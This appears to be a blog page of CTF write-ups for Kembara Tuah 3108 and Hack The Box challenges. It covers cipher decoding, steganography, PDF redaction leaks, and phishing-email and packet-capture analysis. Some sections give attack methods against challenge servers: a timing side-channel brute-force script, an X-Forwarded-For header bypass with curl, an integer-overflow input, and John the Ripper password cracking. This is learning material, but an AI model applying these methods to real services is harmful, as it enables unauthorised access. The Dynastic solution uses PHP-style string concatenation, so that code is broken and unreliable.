flag=((3108,\u0026#34;{\u0026#34;,p,q,b,p,l,g,l,q,l,v,\u0026#34;_\u0026#34;,d,g,h,s,v,k,\u0026#34;_\u0026#34;,l,v,m,l,\u0026#34;}\u0026#34;)[::-1]) From the script we can see there\u0026rsquo;s the flag variable set to the predefined variables in reverse.\nThen what we can do is remove the slice notation and join the flag and print it out. Solution.py\na,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z=\u0026#39;j\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;p\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;q\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;x\u0026#39;,\u0026#39;z\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;w\u0026#39; flag=\u0026#34;\u0026#34;.join(str(i) for i in (3108,\u0026#34;{\u0026#34;,p,q,b,p,l,g,l,q,l,v,\u0026#34;_\u0026#34;,d,g,h,s,v,k,\u0026#34;_\u0026#34;,l,v,m,l,\u0026#34;}\u0026#34;)) print(flag) Syah Sesat # Semasa Syah berada di Muzium Kota Kayang, dia telah menyaksikan sebuah persembahan Gambus yang dipersembahkan oleh seorang pemuzik dari Sabah yang berkunjung ke muzium tersebut. Lagu yang dipersembahkan ketika itu bertajuk Ampuk Ampuk Bulan. Kagum akan persembahan tersebut, beliau telah meninggalkan satu pesanan di bawah bersama kunci. Bolehkan anda merungkaikan pesanan tersebut dan mendapatkan Flag?\nCipher : }AYPF_KYMSOL_TOMMNG{8013EJVWASCUQOYOAGNURBETMYUIBMTNHGMALKGZTXUBDPS Key : AMPUKAMPUKBULAN\nFlag: 3108{GAMBUS_BUDAYA_LAMA}\nFor this challenge, we are given a cipher text and a key. Cipher Text\n}AYPF_KYMSOL_TOMMNG{8013EJVWASCUQOYOAGNURBETMYUIBMTNHGMALKGZTXUBDPS Key\nAMPUKAMPUKBULAN Given the cipher text and key, using CyberChef I tried to decode it using Vigenère cipher and the output was noticeably reversed. So I reverse it and the flag can be seen.\nTanpa Nama 3 # Flag: 3108{S1MPL3_CRPYT0_CHALLENGE}\nFor this challenge we are given a python script. cryptochalle.py\ndef xor_with_binary(binary_str, xor_str): binaries = binary_str.split() xor_num = int(xor_str, 2) xor_results = [] for b in binaries: num = int(b, 2) result_num = num ^ xor_num xor_results.append(format(result_num, \u0026#39;08b\u0026#39;)) return \u0026#39; \u0026#39;.join(xor_results) binary_str = \u0026#34;01010110 01010100 01010101 01011101 00011110 00110110 01010100 00101000 00110101 00101001 01010110 00111010 00100110 00110111 00110101 00111100 00110001 01010101 00111010 00100110 00101101 00100100 00101001 00101001 00100000 00101011 00100010 00100000 00011000\u0026#34; xor_str = \u0026#34;01100101\u0026#34; The function is XORing the binary_str with xor_str, what I did was place the arguments with the variables provided and print the output. Which I throw into CyberChef and convert the binary string.\nzZzZz # ZZZZZ ZZZzZ ZZZZZ ZZZZZ ZzZZz ZZZZ ZZZ ZZ ZZZZZ ZZzZZ ZZzZZ ZzZZ ZZZZZZ ZZzZZ\nFlag: 3108{700ef4a79959615b67ea5297e725c06e}\nWe were asked who the name of the Laksamana that killed Sultan Mahmud in 1699 and quick google search says that its Laksamana Bentan and submitting the answer shows the hex string. Hex string\n0x33z0x31z0x30z0x380x7bz0x37z0x30z0x30z0x650x66z0x34z0x61z0x37z0x39z0x39z0x350x39z0x360x31z0x350x62z0x360x37z0x650x61z0x35z0x32z0x39z0x37z0x65z0x37z0x32z0x350x63z0x300x36z0x65z0x7dz Using CyberChef to convert the hex will show us the flag Forensic # Daerah Sabah \u0026amp; Sarawak # Setiap negeri mempunyai daerah. Begitu juga negeri Sabah dan Sarawak mempunyai daerah tersendiri. Cari \u0026lsquo;flag\u0026rsquo; yang mengandungi bilangan daerah Sabah dan Sarawak di dalam file tersebut.\nFlag: 3108{S4B4H_27_D43RAH_S4R4W4K_40_D43R4H} We are given a zip file\nThen I proceed to unzip the zip file and obtained 3 jpg file.\nThese images does not show anything, so I tried to use Stegoveritas to extract the 3.jpg because it feels weird to have AI generated image to mix with the rest normal looking images. Also the file size seems to be larger than the rest that might indicate something is hidden within the image itself.\nStegoveritas managed to find an archived file hidden in the 3.jpg extracted the file out. I checked the file and it\u0026rsquo;s a RAR archive file, I then proceed to extract the file and obtained a text file and a zip file. The Daerah_Sabah\u0026amp;Sarawak.txt contains the names of all the Town and City in Sabah and Sarawak. The file.zip however is AES encrypted. Which got me thinking that the given text file might be the wordlist that can be use for bruteforce. The password can be obtained by using zip2john and run JohnTheRipper using the wordlist above. After extracting the file, the flag can be obtained.\nKontras # Sekarang anda tidak dapat membaca dengan betul. Sejarah ringkas ini mempunyai beberapa data kritikal di dalamnya, beberapa daripadanya telah disunting dengan betul, manakala ada yang tidak. Bolehkah anda mencari kunci penting yang tidak disunting dengan betul?\nFlag: 3108{Peghak_Darul_ridzuAn}\nWe are given a PDF file that seems to have redacted words. However, the PDF is not properly redacted and the text can still be highlighted and copied (which is not supposed to happen) I just copied the whole text to notepad and find the keyword 3108{\nLahad Datu # Scott seorang bangsa Melayu kacukan darah British ingin mengetahui peristiwa hitam yang berlaku di Sabah yang ada di dalam dokumen \u0026ldquo;Lahad Datu\u0026rdquo;. Tetapi dokumen tersebut mempunyai kata laluan. Bantu Scott untuk membuka dokumen berkenaan.\nFlag: 3108{0P3R4S1_D4UL4T}\nWe are given an encrypted Word document.\nWithout any hint given, I tried to brute-force the password using JohnTheRipper with common wordlist. The brute-force process was rather quick and I used the password to open the Word document. There\u0026rsquo;s the flag at the bottom, but is it the real flag? Seems like gibberish to me, hence I notice the JamalulKiramIII that was bolded and thought that it might be used to decode the flag. So I go over to trusty CyberChef and used the Vigenère module to decode the flag. Pahlawan Lagenda # Penyerang telah mencuba merosakkan dan menyembunyikan sesuatu di dalam data hikayat Hang Tuah yang sangat besar pada masa lalu, mungkin mereka masih melakukannya. Muat turun data di sini.\nFlag: 3108{gr3p_15_@w3s0m3_l4ks4m4n4}\nWe are given a text file which is full of text, so I go ahead and CTRL+F the flag keyword 3108{ The flag can be obtained.\nLinux # Cer Cari # Setiap negeri mempunyai tarikh penting. CerCari Tarikh penting bagi negeri Sabah.\nFlag: 3108{S4b4h_1963}\nWe are given a file with a bunch of strings with the flag format. However the hint is given in the description saying it\u0026rsquo;s an important date for Sabah. Which got me thinking what could be more important than 1963 (formation of Malaysia).\nGrepping the keyword 1963 shows a match, which means the flag might be correct and it is indeed correct.\nMakanan Popular # Sarawak mempunyai pelbagai makanan tradisional yang menarik. Cuba cari makanan tradisional yang popular di Sarawak di dalam file yang disediakan.\nFlag: 3108{L4KS4_S4R4W4K}\nWe are given an ELF executable file.\nHence, I tried running the file and got an output saying that I should try using strings. Which means that the flag can be grep.\nAnd we got my favourite food Laksa Sarawak!\nReverse # Asal Nama Sabah # Setiap negeri mempunyai asal nama negeri tersebut. Begitu juga dengan negeri Sabah. Sabah juga mempunyai nama asal negeri tersebut yang popular di kalangan masyarakat tempatan.\nFlag: 3108{S4B4H_S4PP4H}\nWe are given an executable file for this challenge. I go ahead and throw the file to DogBolt(great platform to test various decompilers). After decompiling, I chose the Hex-Rays decompiler as it seems to be more readable.\nThe function that we should put our focus on is this check_flag function.\nBasically the each character from s2 will be XORed with each character from s. With that I used ChatGPT to help me craft the script to decode the flag. Solution.py\ns = \u0026#34;namaasalsabah\u0026#34; s2 = \u0026#34;5d505d591a20552e47293d325c3e3159291c\u0026#34; v4 = len(s) #13 # Convert hex string to a list of integers s2_bytes = [int(s2[i:i+2], 16) for i in range(0, len(s2), 2)] # XOR with corresponding characters from s decoded_bytes = [s2_bytes[i] ^ ord(s[i % v4]) for i in range(len(s2_bytes))] # Convert decoded bytes back to a string decoded_string = \u0026#39;\u0026#39;.join(chr(b) for b in decoded_bytes) print(\u0026#34;Decoded flag:\u0026#34;, decoded_string) Berenang Ke Tepian # Berakit, berakitlah ke hulu Berenang, berenangku ke tepian Bersakit, biar kusakit dahulu Bersenang denganmu kemudian\nKelip-kelip kusangkakan api Sinar matahari membawa cahaya Kau hilang ghaib, sangkaku kaubenci Kiranya sengaja nak menduga\nFlag: 3108{s1mpl3_p3ngundur4n}\nWe are given an ELF executable and the NetCat connection to obtain the real flag. I uploaded the binary to DogBolt to decompile to understand the code and found something interesting. Which is the Sleep timer that is being applied given that the character is correct. If the character is wrong, then it will terminate without the Sleep timer being imposed. That means, we can exploit this functionality to brute-force the flag, this exploit is also known as Side Channel Attack (watch this video to understand side channel attack)\nNow knowing that I asked ChatGPT to help me create a script to perform the attack. I set the flag length to 100 because I\u0026rsquo;m not sure how long the flag was and I just did it the \u0026ldquo;dirty\u0026rdquo; way. The brute-force process took a long time, there should be better solution to this.\nimport socket import time import string def send_input_and_measure_time(input_string, remote_ip, remote_port): \u0026#34;\u0026#34;\u0026#34;Send input to the remote service and measure the time taken for a response.\u0026#34;\u0026#34;\u0026#34; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((remote_ip, remote_port)) s.sendall((input_string + \u0026#39;\\n\u0026#39;).encode()) start_time = time.perf_counter() response = receive_response(s) end_time = time.perf_counter() response_time = end_time - start_time finally: s.close() return response_time, response def receive_response(sock): \u0026#34;\u0026#34;\u0026#34;Receive the full response from the server.\u0026#34;\u0026#34;\u0026#34; response = b\u0026#39;\u0026#39; while True: chunk = sock.recv(4096) if not chunk: break response += chunk if b\u0026#39;\\n\u0026#39; in response: break return response.decode() def find_flag_character(position, current_flag, remote_ip, remote_port): \u0026#34;\u0026#34;\u0026#34;Determine the best character for the given position in the flag.\u0026#34;\u0026#34;\u0026#34; characters = string.ascii_letters + string.digits + string.punctuation best_char = \u0026#39;\u0026#39; max_time = 0 for char in characters: guess = current_flag + char response_time, _ = send_input_and_measure_time(guess, remote_ip, remote_port) if response_time \u0026gt; max_time: max_time = response_time best_char = char return best_char def recover_flag(remote_ip, remote_port, known_prefix): \u0026#34;\u0026#34;\u0026#34;Recover the full flag by guessing each character, starting from a known prefix.\u0026#34;\u0026#34;\u0026#34; flag = known_prefix flag_length = 100 # Initial guess for the length of the flag for i in range(len(known_prefix), flag_length): flag += find_flag_character(i, flag, remote_ip, remote_port) print(f\u0026#34;Flag so far: {flag}\u0026#34;) print(f\u0026#34;Recovered Flag: {flag}\u0026#34;) # Example usage remote_ip = \u0026#39;103.28.91.24\u0026#39; # Remote IP address remote_port = 10020 # Remote port known_prefix = \u0026#34;3108{\u0026#34; # Known initial part of the flag recover_flag(remote_ip, remote_port, known_prefix) The flag can be obtained after the brute-force process finished.\nIlmu Hisab # Mampukah tuan hamba mengira?\nFlag: 3108{n0mb0r_k3r4mat}\nWe are given an ELF file to reverse and NetCat connection to get the actual flag. Using DogBolt we can look at the decompiled code. At which we would put our attention to the function addtwonumber which will accept two values where v9 = first value v10 = second value\nNotice that the first highlighted If statement checks if the the value of v9 is less than MAX Numeric Limit - 83647.\nThen the second highlighted If statement checks If the value of v9 = 1337 AND v10 greater than 7331 AND the sum of both value needs to be less than 0. (Impossible) OR If the value of v9 less than 0 AND v10 less than 0 AND sum of both more than 0 (Impossible)\nThe If statement seems to be impossible to achieve merdeka function. But not with Integer Overflow. (Watch this video: Overflow in Signed and Unsigned Numbers)\nTo obtain merderka function. We can add v9 + v10 \u0026gt; 2147483647 which is the MAX Numeric Limit. Using the first condition where v9 = 1337 AND v10 greater than 7331 to perform the overflow. Since we know that v9 cannot be changed, we need to find v10. v10 = 2147483657 - 1336 = 2147482321\nWith that we can reach merdeka function which will reveal the flag.\nSarawak Kita # Ada pendapat yang menyatakan bahawa Kuching mendapat nama sempena sebatang sungai kecil, Sungai Kuching yang mengalir di antara Muzium Cina dan Kuil Tua Pek Kong. Sungai Kuching pula barangkali memperoleh nama daripada Kucing Hutan yang kerap mengunjunginya. Sungai tersebut juga berhampiran dengan sebuah bukit yang banyak ditumbuhi oleh pokok Buah Mata Kucing. Lantaran tersebut ianya diberi nama Bukit Mata Kucing. Tapi ini bukan tentang kisah Kuching, ini kisah bagaimana ingin mendapatkan \u0026lsquo;flag\u0026rsquo; di dalam document yang berbahaya.\nFlag: 3108{Kuch1ng_1bu_N3g3r1_S4r4w4k}\nWe are given a Word Document, using oleid it can be seen that the document contains VBA macros With that I used olevba to read the VBA code, and found a Base64 hash As always I will use the trusty CyberChef to decode the Base64 and obtained the flag. This article from Intezer explains in detail how to analyze Microsoft Office files.\nWeb # Selangorku # Hi semua saya @AnakSelangor86. Saya seorang Web Developer yang mempunyai semangat patriotik yang tinggi terhadap kemerdekaan terutamanya negeri selangor saya ada cipta satu website mengenai selangor dan hanya orang tertentu sahaja bole access ke website tersebut :)\nselamat mencubaa perwira!!!!\nFlag: 3108{S3lang0r_temp4t_kelahiran_ku}\nTrying to access the webpage will give us 403 Forbidden. I then go and search online for any possible solution and found this writeup Then I tried using Curl with X-Forwarderd-For header to local host.\ncurl -v \u0026lt;url\u0026gt; -H \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39; Which I am able to access the site and it shows a list of html files. I tried to access it using the above method and found the flag at the hulu_selangor.html I found this to be quite similar and very helpful resource Cyber Plumber Handbook, which teach about ways to navigate around the network using SSH and port redirection.\n","date":"2 September 2024","externalUrl":null,"permalink":"/posts/kembara3108/","section":"Posts","summary":"This page provides writeups for Kembara Tuah 3108 CTF challenges, covering Crypto, Forensic, Linux, Reverse Engineering, and Web tasks, with solutions involving decryption, steganography, brute-forcing, and exploiting vulnerabilities to retrieve flags.","title":"Kembara Tuah 3108 - Writeups","type":"posts"},{"content":" Crypto # Dynastic # You find yourself trapped inside a sealed gas chamber, and suddenly, the air is pierced by the sound of a distorted voice played through a pre-recorded tape. Through this eerie transmission, you discover that within the next 15 minutes, this very chamber will be inundated with lethal hydrogen cyanide. As the tape’s message concludes, a sudden mechanical whirring fills the chamber, followed by the ominous ticking of a clock. You realise that each beat is one step closer to death. Darkness envelops you, your right hand restrained by handcuffs, and the exit door is locked. Your situation deteriorates as you realise that both the door and the handcuffs demand the same passcode to unlock. Panic is a luxury you cannot afford; swift action is imperative. As you explore your surroundings, your trembling fingers encounter a torch. Instantly, upon flipping the switch, the chamber is bathed in a dim glow, unveiling cryptic letters etched into the walls and a disturbing image of a Roman emperor drawn in blood. Decrypting the letters will provide you the key required to unlock the locks. Use the torch wisely as its battery is almost drained out!\nFlag: HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER}\nFor this challenge, there are 2 files. The output file and also the source code. Output.txt\nMake sure you wrap the decrypted text with the HTB flag format :-] DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL Source.py\nfrom secret import FLAG from random import randint def to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def encrypt(m): c = \u0026#39;\u0026#39; for i in range(len(m)): ch = m[i] if not ch.isalpha(): ech = ch else: chi = to_identity_map(ch) ech = from_identity_map(chi + i) c += ech return c with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;Make sure you wrap the decrypted text with the HTB flag format :-]\\n\u0026#39;) f.write(encrypt(FLAG)) This is a simple algorithm to encrypt the data. Here\u0026rsquo;s how it works:\nIt will iterate through all of the data one by one. Check if the character is alphabet letters, True: Minus the hex value of that ASCII character with 0x41, and then get the value of modulo 26 of the minus value and add 0x41 to it. After that, add the value with the current number of iteration. Then append the value into a variable X. False: Append that value into a variable X. Append the value from above into the variable Crypt. Return the value Crypt. The solution is very simple, just by reversing the steps used to encrypt the flag and the flag can be obtained. Solution.py\n#from secret import FLAG #from random import randint def to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def encrypt(m): c = \u0026#39;\u0026#39; for i in range(len(m)): ch = m[i] if not ch.isalpha(): # If not a character ech = ch else: #If it\u0026#39;s a character chi = to_identity_map(ch) ech = from_identity_map(chi + i) c += ech return c def decrypt(flag): unencrypted_text = \u0026#39;\u0026#39; for i in range(len(flag)): char = flag[i] if not char.isalpha(): dchar = char else: ichar = to_identity_map(char) dchar = from_identity_map(ichar - i) unencrypted_text += dchar return unencrypted_text #with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: # f.write(\u0026#39;Make sure you wrap the decrypted text with the HTB flag #format :-]\\n\u0026#39;) # f.write(encrypt(FLAG)) flag = \u0026#34;DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL\u0026#34; print(\u0026#34;HTB{\u0026#34;.decrypt(flag).\u0026#34;}\u0026#34;) Iced Tea # Locked within a cabin crafted entirely from ice, you\u0026rsquo;re enveloped in a chilling silence. Your eyes land upon an old notebook, its pages adorned with thousands of cryptic mathematical symbols. Tasked with deciphering these enigmatic glyphs to secure your escape, you set to work, your fingers tracing each intricate curve and line with determination. As you delve deeper into the mysterious symbols, you notice that patterns appear in several pages and a glimmer of hope begins to emerge. Time is flying and the temperature is dropping, will you make it before you become one with the cabin?\nFlag: HTB{th1s_1s_th3_t1ny_3ncryp710n_4lg0r1thm_y0u_m1ght_h4v3_4lr34dy_s7umbl3d_up0n_1t_1f_y0u_d0_r3v3rs1ng}\nGiven 2 file, one output and one source as shown below. Output.txt\nKey : 850c1413787c389e0b34437a6828a1b2 Ciphertext : b36c62d96d9daaa90634242e1e6c76556d020de35f7a3b248ed71351cc3f3da97d4d8fd0ebc5c06a655eb57f2b250dcb2b39c8b2000297f635ce4a44110ec66596c50624d6ab582b2fd92228a21ad9eece4729e589aba644393f57736a0b870308ff00d778214f238056b8cf5721a843 Source.py\nimport os from secret import FLAG from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b\u0026#39;\u0026#39;.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def encrypt(self, msg): msg = pad(msg, self.BLOCK_SIZE//8) blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)] ct = b\u0026#39;\u0026#39; if self.mode == Mode.ECB: for pt in blocks: ct += self.encrypt_block(pt) elif self.mode == Mode.CBC: X = self.IV for pt in blocks: enc_block = self.encrypt_block(self._xor(X, pt)) ct += enc_block X = enc_block return ct def encrypt_block(self, msg): m0 = b2l(msg[:4]) m1 = b2l(msg[4:]) K = self.KEY msk = (1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1 s = 0 for i in range(32): s += self.DELTA m0 += ((m1 \u0026lt;\u0026lt; 4) + K[0]) ^ (m1 + s) ^ ((m1 \u0026gt;\u0026gt; 5) + K[1]) m0 \u0026amp;= msk m1 += ((m0 \u0026lt;\u0026lt; 4) + K[2]) ^ (m0 + s) ^ ((m0 \u0026gt;\u0026gt; 5) + K[3]) m1 \u0026amp;= msk m = ((m0 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) + m1) \u0026amp; ((1 \u0026lt;\u0026lt; self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) if __name__ == \u0026#39;__main__\u0026#39;: KEY = os.urandom(16) cipher = Cipher(KEY) ct = cipher.encrypt(FLAG) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;Key : {KEY.hex()}\\nCiphertext : {ct.hex()}\u0026#39;) By the name of the challenge, I begin with searching \u0026ldquo;Iced Tea encryption\u0026rdquo; on Google and I found out a Wiki page explaining the eXtended Tiny Encryption Algorithm. The cipher code was similar to the one provided I used ChatGPT to help me understand the code and come with the following script to decrypt the flag.\nfrom Crypto.Util.Padding import unpad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum import os class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b\u0026#39;\u0026#39;.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def decrypt(self, ct): blocks = [ct[i:i+self.BLOCK_SIZE//8] for i in range(0, len(ct), self.BLOCK_SIZE//8)] pt = b\u0026#39;\u0026#39; if self.mode == Mode.ECB: for ct_block in blocks: pt += self.decrypt_block(ct_block) elif self.mode == Mode.CBC: X = self.IV for ct_block in blocks: pt_block = self._xor(X, self.decrypt_block(ct_block)) pt += pt_block X = ct_block return pt def decrypt_block(self, ct): c = b2l(ct) m0 = c \u0026gt;\u0026gt; (self.BLOCK_SIZE//2) m1 = c \u0026amp; ((1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1) K = self.KEY msk = (1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1 s = self.DELTA \u0026lt;\u0026lt; 5 for i in range(32): m1 -= ((m0 \u0026lt;\u0026lt; 4) + K[2]) ^ (m0 + s) ^ ((m0 \u0026gt;\u0026gt; 5) + K[3]) m1 \u0026amp;= msk m0 -= ((m1 \u0026lt;\u0026lt; 4) + K[0]) ^ (m1 + s) ^ ((m1 \u0026gt;\u0026gt; 5) + K[1]) m0 \u0026amp;= msk s -= self.DELTA m = ((m0 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) + m1) \u0026amp; ((1 \u0026lt;\u0026lt; self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) # Parse Key and Ciphertext from file with open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: lines = f.readlines() KEY = bytes.fromhex(lines[0].split(\u0026#34;:\u0026#34;)[1].strip()) ct_hex = lines[1].split(\u0026#34;:\u0026#34;)[1].strip() # Initialize Cipher object with Key cipher = Cipher(KEY) # Decrypt Ciphertext ct = bytes.fromhex(ct_hex) pt = cipher.decrypt(ct) # Remove Padding pt = unpad(pt, cipher.BLOCK_SIZE//8) print(\u0026#34;Decrypted plaintext:\u0026#34;, pt.decode()) Makeshift # Weak and starved, you struggle to plod on. Food is a commodity at this stage, but you can’t lose your alertness - to do so would spell death. You realise that to survive you will need a weapon, both to kill and to hunt, but the field is bare of stones. As you drop your body to the floor, something sharp sticks out of the undergrowth and into your thigh. As you grab a hold and pull it out, you realise it’s a long stick; not the finest of weapons, but once sharpened could be the difference between dying of hunger and dying with honour in combat.\nFlag: HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}\nFor this challenge we are given an output file and a source file as below. Output.txt\n!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB Source.py\nfrom secret import FLAG flag = FLAG[::-1] new_flag = \u0026#39;\u0026#39; for i in range(0, len(flag), 3): new_flag += flag[i+1] new_flag += flag[i+2] new_flag += flag[i] print(new_flag) It is a simple algorithm which works as follow:\nInverse the value of the flag. Create a variable called new_flag. In a for loop, iterate every 3 step until it reached the end of the value of the flag and append the value in the order of 2nd, 3rd, and 1st position. (Let\u0026rsquo;s say there\u0026rsquo;s a string of \u0026ldquo;ABC\u0026rdquo; the algorithm will append the string in such order \u0026ldquo;BCA\u0026rdquo;). Pos Original Value Value After 1 A B 2 B C 3 C A After knowing that, I started writing the script to reverse the algorithm, which is by appending the value of the given string in the order of 3rd, 1st, and 2nd position to obtain the value and inverse it to obtain the original flag.\nnew_flag = \u0026#34;!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB\u0026#34; old_flag = \u0026#34;\u0026#34; for i in range (0,len(new_flag),3): old_flag += new_flag[i+2] old_flag += new_flag[i] old_flag += new_flag[i+1] print(old_flag[::-1]) Primary Knowledge # Surrounded by an untamed forest and the serene waters of the Primus river, your sole objective is surviving for 24 hours. Yet, survival is far from guaranteed as the area is full of Rattlesnakes, Spiders and Alligators and the weather fluctuates unpredictably, shifting from scorching heat to torrential downpours with each passing hour. Threat is compounded by the existence of a virtual circle which shrinks every minute that passes. Anything caught beyond its bounds, is consumed by flames, leaving only ashes in its wake. As the time sleeps away, you need to prioritise your actions secure your surviving tools. Every decision becomes a matter of life and death. Will you focus on securing a shelter to sleep, protect yourself against the dangers of the wilderness, or seek out means of navigating the Primus’ waters?\nFlag: HTB{0h_d4mn_4ny7h1ng_r41s3d_t0_0_1s_1!!!}\nWe are given 2 file, one output.txt and one source.py as follow: Output.txt\nn = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347 e = 65537 c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215 Source.py\nimport math from Crypto.Util.number import getPrime, bytes_to_long from secret import FLAG m = bytes_to_long(FLAG) n = math.prod([getPrime(1024) for _ in range(2**0)]) e = 0x10001 c = pow(m, e, n) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;{n = }\\n\u0026#39;) f.write(f\u0026#39;{e = }\\n\u0026#39;) f.write(f\u0026#39;{c = }\\n\u0026#39;) I noticed that the source code reassemble RSA encryption algorithm. The output provided the value of n, e and c. The value of n seems to be single value of prime number with the for loop (multiplied to 0). Hence I wrote the code to decrypt the value of the flag as below.\nSolution.py\nfrom Crypto.Util.number import inverse, long_to_bytes n = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347 e = 65537 c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215 # Calculate the modular inverse of e modulo (p-1)(q-1) # Assuming n is the product of two large primes p and q # Since we don\u0026#39;t know p and q, we can\u0026#39;t directly calculate phi(n), so we\u0026#39;ll use the alternative approach d = inverse(e, (n - 1)) # Decrypt the ciphertext m = pow(c, d, n) print(\u0026#34;Decrypted message (m):\u0026#34;, long_to_bytes(m)) Forensic # Urgent # In the midst of Cybercity\u0026rsquo;s \u0026ldquo;Fray,\u0026rdquo; a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions\u0026rsquo; destiny.\nFlag: HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}\nThe files given for this challenge was a file Electric Mail Format file extension. I then search for more information about this file extension and I came across emlAnalyzer tool to view the content of the EML file and also extracting data from it.\nAfter installing the tool, I started reading the help guide and learn how to use the tool. I first started analyze the file and found out that there\u0026rsquo;s a HTML attachment. Upon further reading on the help guide, the emlAnlayzer can also extract the attachment from the EML file. So I proceed to extract the HTML file out. I then open the extracted HTML file in the browser but it shows 404 Not Found. I then proceed to view the source of the HTML file itself and found something. It is an encoded JavaScript code. Since the code was not heavily obfuscated I can easily decode the encoded script. I just use the console of the browser and use the console.log() and unescape() function to obtain the flag. I also noticed that the flag can be obtained via the Inspect Element tool of the browser. Other than that, I also found out that the EML file is an ASCII text file and I output the content of the file and got a Base64 encoded data of the attachment. I proceed to use CyberChef to decode the Base64 data, and I obtained the same value as when I view the page source of the HTML file. Phreaky # In the shadowed realm where the Phreaks hold sway, A mole lurks within, leading them astray. Sending keys to the Talents, so sly and so slick, A network packet capture must reveal the trick. Through data and bytes, the sleuth seeks the sign, Decrypting messages, crossing the line. The traitor unveiled, with nowhere to hide, Betrayal confirmed, they\u0026rsquo;d no longer abide.\nFlag: HTB{Th3Phr3aksReadyT0Att4ck}\nThe file given is a PCAP file, hence I opened it using WireShark to analyze it. First I open up the Capture File Properties to identify what am I dealing with. I then dig into the Protocol Hierarchy Statistics and found out that most of there\u0026rsquo;s a huge portion in Internet Message Format and HTTP. So I then applied the filter to filter the IMF protocol first. I found out that there\u0026rsquo;s plain text data of the password and also filename, and I noticed that the file type is in ZIP format. I then search online on how to extract file from WireShark and found this video on YouTube which guide on how to export the data from WireShark. I also note down all of the filename and password for the extraction of data later. I then proceed to export the file from WireShark and noticed that the content type of the exports are EML. I proceed to use the emlAnalyzer to extract the ZIP file from the all of the exported EML file from WireShark earlier. Here\u0026rsquo;s where the filename and password from earlier comes in handy. I just pasted the password to extract the file for each of the ZIP file extracted and I got these PDF fragments. So, I just use a simple command to combine all these PDF fragments into one combined PDF file. After that, I open up the combined pdf and found the flag. Hardware # Maze # In a world divided by factions, 